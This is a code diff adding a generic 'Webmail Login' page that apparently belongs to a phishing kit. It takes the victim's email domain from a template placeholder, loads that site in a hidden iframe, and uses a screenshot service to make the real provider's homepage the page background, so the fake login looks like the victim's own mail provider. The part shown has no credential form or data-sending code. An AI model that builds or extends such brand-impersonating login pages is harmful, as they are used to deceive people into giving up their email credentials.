@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Webmail Portal Login</title>
+
+<style>
+html, body {
+    height: 100%;
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+/* Background layer */
+#bg {
+    position: fixed;
+    inset: 0;
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    z-index: -1;
+    transition: background-image 0.4s ease;
+}
+
+/* Fallback gradient */
+.bg-fallback {
+    background-image: linear-gradient(135deg, #0d4f8b, #1e90ff);
+}
+
+/* Login card */
+.form-holder {
+    background: rgba(255,255,255,0.92);
+    width: 600px;
+    margin: 180px auto;
+    padding-bottom: 20px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.25);
+    border-radius: 6px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Background -->
+<div id="bg" class="bg-fallback"></div>
+
+<!-- Hidden iframe for detection only -->
+<iframe id="probe" style="display:none;"></iframe>
+
+<div class="form-holder">
+    <h2 style="padding:20px;text-align:center;">Webmail Login</h2>
+</div>
+
+<script>
+(function () {
+    const domain = "{{ins}}"; // example: gmail.com
+    const bg = document.getElementById("bg");
+    const iframe = document.getElementById("probe");
+
+    let blocked = false;
+
+    // Detect iframe blocking
+    iframe.src = "https://www." + domain;
+
+    iframe.onload = () => {
+        if (blocked) return;
+
+        // Auto-generate background using screenshot API
+        bg.style.backgroundImage =
+            `url("https://image.thum.io/get/width/1920/https://www.${domain}")`;
+    };
+
+    iframe.onerror = () => {
+        blocked = true;
+        bg.classList.add("bg-fallback");
+    };
+
+    // Timeout fallback (iframe silently blocked)
+    setTimeout(() => {
+        if (!iframe.contentDocument) {
+            bg.classList.add("bg-fallback");
+        }
+    }, 2500);
+})();
+</script>
+
+</body>
+</html>
